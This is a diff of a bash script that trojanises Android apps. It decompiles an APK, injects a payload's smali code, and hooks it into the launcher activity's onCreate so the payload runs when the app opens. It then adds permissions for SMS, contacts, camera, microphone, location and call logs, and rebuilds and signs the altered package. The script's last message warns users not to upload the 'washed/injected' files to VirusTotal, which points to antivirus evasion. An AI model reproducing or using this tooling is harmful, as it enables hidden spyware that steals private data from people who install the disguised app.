@@ -58,31 +58,34 @@ sed -i "s#payload#loader#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 cp -r /tmp/payload/smali/com/$VAR1 /tmp/original/smali/com/.
 
 #locate the launcher .smali. We are looking for the MAIN being called directly before LAUNCHER. We then take this line number and begin looping backwards through the file to find the android name of the .smali file we need to inject into.
-#lineNumber=`perl -lne 'print $.,":",$_ if /android.intent.action.MAIN/ .. /LAUNCHER/' /tmp/original/AndroidManifest.xml | cut -d: -f1 | awk 'NR==1{print $1}'`
 lineNumber=`grep -n -A 1 android.intent.action.MAIN /tmp/original/AndroidManifest.xml | grep android.intent.category.LAUNCHER | cut -d- -f1`
 let lineNumber-=1
+echo
 echo -e "\033[34m Line number of AndroidManifest.xml MAIN: $lineNumber \x1B[0m"
+echo
 until [  $lineNumber -lt 2 ] || [[ ! -z "${smaliFile// }" ]]; do
     smaliFile=`sed -n "$lineNumber p" /tmp/original/AndroidManifest.xml | grep android:label=\"@string/app_name\" | grep android:name=\"`
     let lineNumber-=1
 done
 echo -e "\033[34m $smaliFile \x1B[0m"
+echo
 echo -e "\033[34m Left until loop at line number: $lineNumber \x1B[0m"
+echo
 echo $smaliFile > /tmp/output
 grep -o -P '(?<=android:name=").*(?=")' /tmp/output | awk 'NR==1{print $1}' > /tmp/output_1  		# grabs just what we need from the string 
-cat /tmp/output_1
 sed -i 's#"##' /tmp/output_1							# Gets rid of extra quote
 sed -i 's/\./\//g' /tmp/output_1                        			# Replaces all "." with "/"
 sed -i 's/[ \t]*$//' /tmp/output_1                  
 launcherSmali=`cat /tmp/output_1`.smali                 			# Stores the result as a variable and appends ".smali"
-echo $launcherSmali
+cat /tmp/output_1	#for debugging
+echo $launcherSmali	#for debugging
 
 #Check if automatic searching worked. If not, then prompt the user to allow manual entry.
 #Check if no recorded output OR if the file it thinks is correct is actually present.
 if [ \! -s /tmp/output_1 ] || [ ! -f /tmp/original/smali/$launcherSmali ] ; then 
     echo; echo
-    echo "Running grep -B 7 -A 2 -n MAIN /tmp/original/AndroidManifest.xml"
-    echo "This is to assist in manually finding the smali file to inject into"
+    echo -e "\033[33m Running grep -B 7 -A 2 -n MAIN /tmp/original/AndroidManifest.xml \x1B[0m"
+    echo -e "\033[33m This is to assist in manually finding the smali file to inject into \x1B[0m"
     echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
     # a little visual aid to find the .smali file easily without manually navigating
     grep -B 7 -A 2 -n MAIN /tmp/original/AndroidManifest.xml 
@@ -91,51 +94,70 @@ if [ \! -s /tmp/output_1 ] || [ ! -f /tmp/original/smali/$launcherSmali ] ; then
     echo -e "\033[31m Was unable to locate the .smali launcher in AndroidManifest.xml with the current grep command in place \x1B[0m"
     echo "Locate MAIN/LAUNCHER functions in /tmp/original/AndroidManifest.xml. Above you will find the path to the .smali file"
     echo
-    echo "Example prompt input: smali/com/path1/path2/MainActivity.smali"
+    echo -e "\033[33m Example prompt input: smali/com/path1/path2/MainActivity.smali \x1B[0m"
     read -p 'Location of MAIN/LAUNCHER .smali file: ' launcherSmali
     if [ ! -f /tmp/original/$launcherSmali ]; then
         echo -e "\033[31m Was unable to locate the .smali file. Please verify the path manually to the .smali file is present in the /tmp/original/<smali> directory. Also, be sure to include the .smali file extension in the prompt.\x1B[0m"
 	echo -e "\033[34m It is good to navigate through the .smali file structure to verify the file is actually present if you are running into issues. \x1B[0m"
+	exit 1
+    else
+	echo -e "\033[32m Located the given smali file \x1B[0m"
     fi
 else
+    echo
     echo -e "\033[32m Found smali in AndroidManifest.xml: $launcherSmali \x1B[0m"
     launcherSmali=smali/$launcherSmali
 fi
 
 #add invoke to launching .smali file to call the payload upon app launch
-#sed -i "/onCreate(/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
 sed -i "/method.*onCreate(/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
-lineNumber=`grep .method /tmp/original/$launcherSmali | grep onCreate\(Landroid/os/Bundle\;\)V`
-#sed -i "$lineNumberi invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
 
 #add all dependencies... because, why not?
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.INTERNET\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.SEND_SMS\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.CALL_PHONE\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.READ_CONTACTS\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.CAMERA\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.READ_SMS\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.READ_CALL_LOG\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.WRITE_CALL_LOG\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.WAKE_LOCK\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/SET_WALLPAPER/a<uses-feature android:name=\"android.hardware.camera\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/SET_WALLPAPER/a<uses-feature android:name=\"android.hardware.camera.autofocus\"/>" /tmp/original/AndroidManifest.xml
-sed -i "/SET_WALLPAPER/a<uses-feature android:name=\"android.hardware.microphone\"/>" /tmp/original/AndroidManifest.xml
-    
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.INTERNET\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SEND_SMS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CALL_PHONE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CAMERA\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_SMS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_CALL_LOG\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.camera\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.camera.autofocus\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.microphone\"/>" /tmp/original/AndroidManifest.xml
+
+#Check to see if the invoke command was inserted before compiling
+if  grep -q "invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali ; then
+    echo; echo -e "\033[32m Successfully injected the payload and invoke was inserted into the launching .smali file. \x1B[0m"
+    echo
+else
+    echo
+    echo -e "\033[31m Failed to insert the invoke command for the payload into the .smali file. \x1B[0m"
+    echo
+    echo -e "\033[33m You can finish this manually by adding 'invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V' to the method that is called upon app launching in the file still present on disk: /tmp/original/$launcherSmali. Once you have did this, then all that you have left to do is build the package with APKTool and sign. "
+    echo
+    echo -e "\033[33m To build use: java -jar $JAR b /tmp/original \x1B[0m"
+    echo
+    echo -e "\033[33m This places the package in /tmp/original/dist \x1B[0m"
+    echo
+    echo -e "\033[33m To sign: 'jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA /tmp/original/dist/$originalApk androiddebugkey' \x1B[0m"
+    echo;echo
+    exit 1
+fi
 
 #Rebuild the package using APKTool
 java -jar $JAR b /tmp/original
@@ -173,7 +195,8 @@ if [ ! -f ~/.android/debug.keystore ]; then
 fi
 echo;
 echo -e "\033[34m Attempting to sign the package with your android debug key \x1B[0m"
-jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA injected_$originalApk androiddebugkey
+echo
+jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA injected_$originalApk androiddebugkey
 echo
 echo -e "\033[34m Signed the .apk file with ~/.android/debug.keystore \x1B[0m"
 echo -e "\033[34m Simply remove the debug.keystore file and re-run the program to be prompted to create a new debug key \x1B[0m"
@@ -183,6 +206,7 @@ rm -rf /tmp/payload
 rm -rf /tmp/original
 rm /tmp/output
 rm /tmp/output_1
+echo
 echo -e "\033[32m Finished! \x1B[0m"
 echo
 echo -e "\033[36m Please do not upload the washed/injected files to VirusTotal.com. \x1B[0m"
